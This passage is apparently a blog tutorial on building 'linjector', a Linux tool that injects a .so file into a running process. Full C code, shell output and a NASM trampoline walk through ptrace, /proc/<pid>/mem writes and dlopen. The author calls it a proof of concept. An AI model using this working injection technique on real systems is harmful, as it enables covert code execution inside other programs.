fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x1), ...}) = 0
getrandom("\xc5\x6b\xc7\xbe\x43\xde\x6e\xdc", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x217ca000
brk(0x217eb000)                         = 0x217eb000
write(1, "Done!\n", 6Done!
)                  = 6
ptrace(PTRACE_DETACH, 27290, NULL, 0)   = 0
exit_group(0)                           = ?
+++ exited with 0 +++(BUTTON)

   You can't actually debug the target process while you're doing this, because you can't debug the same
   thing twice.

Reading registers
   Let's read registers from the process. We saw PTRACE_GETREGS earlier, so I read just enough of the
   documentation to figure out how to use it, then gave it a shot:
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

int main(int argc, char *argv[]) {
	if(argc < 2) {
		fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
		exit(1);
	}

	pid_t pid = atol(argv[1]);

	if(ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
		fprintf(stderr, "Error attaching: %d\n", errno);
		exit(1);
	}

	// Wait for the attach to complete
	int status;
	waitpid(pid, &status, WSTOPPED);

	// Save registers
	struct user_regs_struct regs;
	ptrace(PTRACE_GETREGS, pid, NULL, &regs);
	printf("rip = %llx\n", regs.rip);

	printf("Done!\n");

	ptrace(PTRACE_DETACH, pid, 0, 0);

	return 0;
	}

   Then run it:
$> ./test $(pgrep target)
rip = 7f51bfa0b457
Done!

   Run it again to make sure it doesn't change (it WILL change if you rerun the application though):
$> ./test $(pgrep target)
rip = 7f51bfa0b457
Done!

   We can use gdb and confirm that IS where it stops (assuming we stop during sleep, which is almost
   guaranteed):
$> gdb -p (pgrep target)
[...]
(gdb) print/x $rip
$1 = 0x7f51bfa0b457

   We can use an identical function call with the same structure and PTRACE_SETREGS to write to
   registers. Try changing rip to an executable memory address containing 0xcc!

Reading memory
   Next, how do we read memory?

   We can basically use /proc/<pid>/mem to access the process's memory, and then pread to read it at an
   arbitrary offset. Of course, we need to know where to read memory from, so we're just going to use
   the program counter - rip - which is the instruction that is about to be executed (using rsp, which
   is the process stack, would also work great):
[...]
#include <fcntl.h>
[...]
	// Save registers
	struct user_regs_struct regs;
	ptrace(PTRACE_GETREGS, pid, NULL, &regs);
	printf("rip = %llx\n", regs.rip);

	char filename[256];
	snprintf(filename, 255, "/proc/%d/mem", pid);

	int mem = open(filename, O_RDWR|O_CLOEXEC);
	if(!mem) {
		fprintf(stderr, "Process doesn't appear to exist, or can't access its memory!\n");
		exit(1);
	}

	unsigned char buffer[16];
	pread(mem, buffer, 16, regs.rip);
	int i;
	for(i = 0; i < 16; i++) {
		printf("%02x ", buffer[i]);
	}

	printf("Done!\n");
	[...]

   And run it:
$> make test && ./test $(pgrep target)
cc     test.c   -o test
rip = 7f51bfa0b457
f7 d8 c3 66 0f 1f 44 00 00 55 48 89 e5 48 83 ec Done!

   And verify that gdb sees the same bytes in the same location:
$> gdb -p (pgrep target)
[...]
(gdb) x/16xb $rip
0x7f51bfa0b457 <__GI___clock_nanosleep+39>:     0xf7    0xd8    0xc3    0x66    0x0f    0x1f    0x44    0x00
0x7f51bfa0b45f <__GI___clock_nanosleep+47>:     0x00    0x55    0x48    0x89    0xe5    0x48    0x83    0xec

Writing memory
   Not only can we use the same technique to write to memory, we can even write to memory that the
   process considers read-only! Memory protections aren't enforced on the /dev/<pid>/mem endpoint.

   Let's write a debug breakpoint (0xcc) to rip (the process counter), then use PTRACE_CONT to resume
   execution:
[...]
	unsigned char wbuffer = 0xcc;
	pwrite(mem, &wbuffer, 1, regs.rip);
	ptrace(PTRACE_CONT, pid, NULL, 0);

	printf("Done!\n");
[...]

   Then run it! If it works the way you'd expect - which it does! - the target program will terminate
   immediately (well, after the sleep ends) with a SIGTRAP:
$> make test && ./test $(pgrep target)
cc     test.c   -o test
rip = 7f51bfa0b457
f7 d8 c3 66 0f 1f 44 00 00 55 48 89 e5 48 83 ec Done!(BUTTON)

   And verify in target's window:
866
867
868
fish: Job 1, './target' terminated by signal SIGTRAP (Trace or breakpoint trap)(BUTTON)

   You also get to see how long it's taken me to write this much, but thankfully the timer resets here!
   :)

Taking control
   Now we're building some tools! We're almost at the point where we have what's essentially a debugger.

   We can technically put the 0xcc anywhere in the code where we want to take control - that's actually
   how your favorite debugger does software breakpoints - but putting it right at rip is a simple way to
   demonstrate.

   This time, we'll do the same thing, but instead of detaching and letting the program crash, we'll use
   waitpid to continue debugging it. waitpid will wait until SIGTRAP hits, and catch it. Once we get
   control back, we validate that it was indeed SIGTRAP, then fix memory, restore registers, and carry
   on.

   This is a good time to show you the full code again, with extra comments, in case you got lost in my
   samples above.. this is still the quick demo app, though, not linjector:
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

int main(int argc, char *argv[]) {
	if(argc < 2) {
		fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
		exit(1);
	}

	pid_t pid = atol(argv[1]);

	// Attach to the process
	if(ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
		fprintf(stderr, "Error attaching: %d\n", errno);
		exit(1);
	}

	// Wait for the attach to complete
	int status;
	waitpid(pid, &status, WSTOPPED);

	// Save registers
	struct user_regs_struct regs;
	ptrace(PTRACE_GETREGS, pid, NULL, &regs);
	printf("rip = %llx\n", regs.rip);

	// Open the memory
	char filename[256];
	snprintf(filename, 255, "/proc/%d/mem", pid);
	int mem = open(filename, O_RDWR|O_CLOEXEC);
	if(!mem) {
		fprintf(stderr, "Process doesn't appear to exist, or can't access its memory!\n");
		exit(1);
	}

	// Read 16 bytes @ rip
	unsigned char buffer[16];
	pread(mem, buffer, 16, regs.rip);
	int i;
	for(i = 0; i < 16; i++) {
		printf("%02x ", buffer[i]);
	}

	// Overwrite the current byte with a breakpoint
	unsigned char wbuffer = 0xcc;
	pwrite(mem, &wbuffer, 1, regs.rip);

	// Continue execution
	ptrace(PTRACE_CONT, pid, NULL, 0);

	// Wait for the process to stop
	waitpid(pid, &status, WSTOPPED);

	// Make sure it's a SIGTRAP and not like SIGSEGV or something
	if(WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
		printf("\nSIGTRAP!\n");
	} else {
		printf("\nSome other signal!\n");
		exit(1);
	}

	// Fix the memory using the first byte of what we read
	pwrite(mem, buffer, 1, regs.rip);

	// Put the registers back to what they were (including rip)
	ptrace(PTRACE_SETREGS, pid, NULL, &regs);
	printf("rip = %llx\n", regs.rip);

	// Continue execution
	ptrace(PTRACE_CONT, pid, NULL, 0);

	printf("Done!\n");

	ptrace(PTRACE_DETACH, pid, 0, 0);

	return 0;
}

   If you run that (don't forget to restart target if it's crashed!), you'll see no special output:
$> make test && ./test $(pgrep target)
cc     test.c   -o test
rip = 7ffb9afdd457
f7 d8 c3 66 0f 1f 44 00 00 55 48 89 e5 48 83 ec
SIGTRAP!
rip = 7ffb9afdd458
Done!

   But also, the target doesn't crash:
[...]
3
4
5
[...]

   At this point, we've basically made a debugger with a software breakpoint! How cool is that?

   Also, once again you can start calculating how quickly I write next time you see target's output!

Run arbitrary code
   At this point, we can effectively overwrite with any shellcode we want (defining "shellcode" as a
   self-contained blob of machine code which usually sets up arguments and calls syscall to do things).
   You can have msfvenom generate something that spawns a shell for example, but that's kinda pointless
   because you can already run a shell on the computer.

   Instead, we want to load a .so file, which means we need to call dlload(). That's a libc function,
   not a syscall, so we can't just do standard shellcode - we need to access libc functions.

   I'm sure there are other ways to do this, but I opted for:
     * Find the address of libc.so.6 in your process
     * Find the address of libc.so.6 in the target process
     * Find the address of dlsym in your process
     * Do math
     * Write a blob of code to rip, with a debug breakpoint at the end
     * Let the process continue executing until it hits the breakpoint
     * Fix the memory, reset the registers back to their original states

   Once you have access to dlsym() (the equivalent of GetProcAddress()), you can find anything else you
   want!

   In retrospect, I realize we could have just gotten the address of dlload() directly, since we don't
   need any other symbols, but being able to call other functions is handy so I'm just leaving it like
   this!

Finding libc
   If you're already running code on the system, you can parse /proc/<pid>/maps to figure out where
   things are loaded:
$> cat /proc/$(pgrep target)/maps | grep 'libc\.so'
7f281913f000-7f2819167000 r--p 00000000 00:21 3141132   /usr/lib64/libc.so.6
7f2819167000-7f28192d5000 r-xp 00028000 00:21 3141132   /usr/lib64/libc.so.6
7f28192d5000-7f2819323000 r--p 00196000 00:21 3141132   /usr/lib64/libc.so.6
7f2819323000-7f2819327000 r--p 001e4000 00:21 3141132   /usr/lib64/libc.so.6
7f2819327000-7f2819329000 rw-p 001e8000 00:21 3141132   /usr/lib64/libc.so.6

   I briefly considered writing my own parser, but thankfully found that somebody already did it,
   and they write code kinda-sorta similarly to me so it fit rather nicely. It also has a permissive
   license, which makes it easy to use in my demo project. Perfect!

   I wrote a little function that can find libc.so.6 in any process (use -1 for the current process)
   based on their example code:
#include "proc_maps_parser/pmparser.h"

unsigned long long find_libc(int pid) {
	procmaps_iterator maps_iter = {0};
	procmaps_error_t parser_err = PROCMAPS_SUCCESS;

	parser_err = pmparser_parse(pid, &maps_iter);
	if (parser_err) {
		fprintf(stderr, "Couldn't parse /proc/%d/maps (error=%d)\n", pid, (int)parser_err);
		exit(1);
	}

	// iterate over areas
	procmaps_struct *mem_region = NULL;
	while ((mem_region = pmparser_next(&maps_iter)) != NULL) {
		if(mem_region->offset == 0 && mem_region->map_type == PROCMAPS_MAP_FILE && \
			!strcmp(mem_region->pathname, "/usr/lib64/libc.so.6")) {
			// Don't return the free'd variable! I know how to C
			void *result = mem_region->addr_start;
			pmparser_free(&maps_iter);

			return (unsigned long long) result;
		}
	}

	pmparser_free(&maps_iter);

	fprintf(stderr, "Couldn't locate the start of /usr/lib64/libc.so.6 in the remote process!\n");
	exit(1);
}

   Then I used that to find the address of libc in both my process and the target process (I also got
   rid of all the write-0xcc-to-the-process code for now):
#include <fcntl.h>
[...]

	// Read 16 bytes @ rip
	unsigned char buffer[16];
	pread(mem, buffer, 16, regs.rip);
	int i;
	for(i = 0; i < 16; i++) {
		printf("%02x ", buffer[i]);
	}
	printf("\n");

	long long local_libc = find_libc(-1);
	long long remote_libc = find_libc(pid);

	printf("local libc = %llx, remote libc = %llx\n", local_libc, remote_libc);

	// Continue execution
	ptrace(PTRACE_CONT, pid, NULL, 0);

	printf("Done!\n");

   And now when we compile, we need to link in the pmparser.c file as well:
$> gcc -Wall -o test test.c proc_maps_parser/pmparser.c && ./test $(pgrep target)
rip = 7f640d142457
f7 d8 c3 66 0f 1f 44 00 00 55 48 89 e5 48 83 ec
local libc = 7f3769a30000, remote libc = 7f640d05e000
Done!

   You'll note that they're loaded in different places - that's ASLR (address space layout
   randomization) at work.

Finding dlsym
   Now the easy part - we use dlsym to get the address of dlsym in our memory space, subtract our libc
   address (to get the offset), then add their libc address (to get the absolute address in the remote
   process):
#include <dlfcn.h>
[...]
unsigned long long find_dlsym(int remote_pid) {
	unsigned long long local_libc = find_libc(-1);
	unsigned long long remote_libc = find_libc(remote_pid);

	printf("local libc = %llx, remote libc = %llx\n", local_libc, remote_libc);

	unsigned long long local_dlsym = (unsigned long long) dlsym(RTLD_DEFAULT, "dlsym");
	unsigned long long dlsym_offset = local_dlsym - local_libc;
	unsigned long long remote_dlsym = dlsym_offset + remote_libc;

	printf("local dlsym = %llx, offset = %llx, remote dlsym = %llx\n", local_dlsym, dlsym_offset, remote_dlsym);

	return remote_dlsym;
}

   And then we can compile/run it:
$> gcc -o test test.c proc_maps_parser/pmparser.c && ./test $(pgrep target)
rip = 7f2459188457
local libc = 7f1cdce13000, remote libc = 7f24590a4000
local dlsym = 7f1cdcea6d50, offset = 93d50, remote dlsym = 7f2459137d50(BUTTON)

   We can verify that address with a debugger (just make sure you don't restart target, because it'll
   change):
$> gdb -p $(pgrep target)
[...]
(gdb) x/i dlsym
   0x7f2459137d50 <___dlsym>:   endbr64(BUTTON)

   It does indeed match!

Writing a trampoline
   I'm quite sure there's a better way to do this, but I wrote what's essentially shellcode with a
   couple templates to populate, and which ends with a debug breakpoint:
bits 64

; Make room on the stack, otherwise we will accidentally overwrite important stuff
; (rsp will be restored afterwards)
sub rsp, 1000

; Save these args to other non-volatile registers
mov rbx, 0x4141414141414141 ; dlsym address

call get_sofile
  db "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\
  BBBBBBBBBBBBBBBBBBBBBBBBBBB",0 ; .so file
get_sofile:
  pop rbp

call get_dlopen
  db "dlopen",0
get_dlopen:
  pop rsi
  mov rdi, 0

  call rbx ; dlsym("dlopen", RTLD_DEFAULT)

mov rdi, rbp
mov rsi, 0x102 ; RTLD_NOW|RTLD_GLOBAL
call rax ; dlopen(<.so file>, RTLD_NOW|RTLD_GLOBAL)

; Indicate that we've finished
db 0xcc(BUTTON)

   Then assemble it:
$> nasm -o trampoline.bin trampoline.asm(BUTTON)

Putting it all together
   Starting here, I'm literally using code from linjector instead of the test program - it got to
   that complexity level!

   I fill in those templates using memmem() to find the offset and them memcpy() to overwrite the
   address of dlsym (and the string to load) at those offsets:

	FILE *f = fopen("trampoline.bin", "rb");
	if(!f) {
		fprintf(stderr, "Couldn't read trampoline.bin!\n");
		exit(1);
	}

	// Get the size
	fseek(f, 0L, SEEK_END);
	long size = ftell(f);
	rewind(f);

	// Allocate memory + read the file
	uint8_t *trampoline = (uint8_t*) malloc(size);
	fread(trampoline, 1, size, f);
	fclose(f);

	// Find and replace our templates
	*((uint64_t*)(memmem(trampoline, size, "AAAAAAAA", 8))) = find_dlsym(pid);
	memcpy(memmem(trampoline, size, "BBBBBBBBBBBBBBBB", 16), argv[2], 128);(BUTTON)

   I wrote a quick function to swap memory (read memory and then overwrite it):

void swap_memory(int mem, uint64_t address, uint8_t *new_value, uint8_t *old_value, size_t length) {
	if(old_value) {
		printf("Reading %ld bytes from 0x%lx...\n", length, address);
		if(pread(mem, old_value, length, address) != length) {
			fprintf(stderr, "Error reading %ld bytes from 0x%lx: %d\n", length, address, errno);
			exit(1);
		}
	}

	printf("Writing %ld bytes to 0x%lx...\n", length, address);
	if(pwrite(mem, new_value, length, address) != length) {
		fprintf(stderr, "Error writing %ld bytes to 0x%lx: %d\n", length, address, errno);
		exit(1);
	}
}

   So using that, I swap out the memory at rip with my shellcode and then continue execution:

	// Swap the current instruction with a breakpoint
	uint8_t *backup = (uint8_t*) malloc(size);

	// Replace the memory at RIP with the trampoline
	swap_memory(mem, regs.rip, trampoline, backup, size);

	// Continue the process
	ptrace(PTRACE_CONT, pid, NULL, 0);(BUTTON)

	When the code completes, it'll swap everything back to the way it was:
	// Wait for the breakpoint
	int status;
	waitpid(pid, &status, WSTOPPED);
	print_signal(status);

	struct user_regs_struct regs2;
	ptrace(PTRACE_GETREGS, pid, NULL, &regs2);
	printf("rip (after) = %llx\n", regs2.rip);

	// Swap memory back
	swap_memory(mem, regs.rip, backup, NULL, size);

	// Restore the registers
	ptrace(PTRACE_SETREGS, pid, NULL, &regs);

	// Detach before exiting
	ptrace(PTRACE_DETACH, pid, 0, 0);(BUTTON)

   And now it's loaded!

   Here's what it looks like with the .so file I created (NOTE that if target is running from a
   different folder, the path to mysolib.so has to be relative to the TARGET's directory, not the
   injector's, because it's running in the context of target (including the working directory):
$> ./linjector $(pgrep target) "$PWD/mysolib.so "
Stopped (signal) (19)
rip = 7f640d142457
Reading 183 bytes from 0x7f640d142457...
Writing 183 bytes to 0x7f640d142457...
Trace/breakpoint trap (5)
rip (after) = 7f640d14250e
Writing 183 bytes to 0x7f640d142457...
Done!

   And in the window for target, where you once again learn how fast I'm typing this:
636
637
638
639
640
Parent = 30734
Test!
641
642
Test!
643
Test!
644
Test!
645
Test!
646
Test!
^CGoodbye parent!

   Now we have our own process and the target process running alongside each other. Friends forever!!

Funny note
   I mentioned at the start that I'd explain why I'm using system("sleep 1") instead of sleep(1).

   Well, because the target process also sleeps, when we do the injection we're actually overwriting
   code inside the sleep() function. That means if we call sleep() again before we fix the memory (in
   the target process), it'll hit the trampoline again and bad things will ensue. :)

Conclusion
   So yeah, using linjector will let you load an arbitrary .so file into an arbitrary process, provided
   you have permissions.

   I wrote this in a couple afternoons as a proof of concept, not as a production tool, so YMMV.

   Have fun!


---

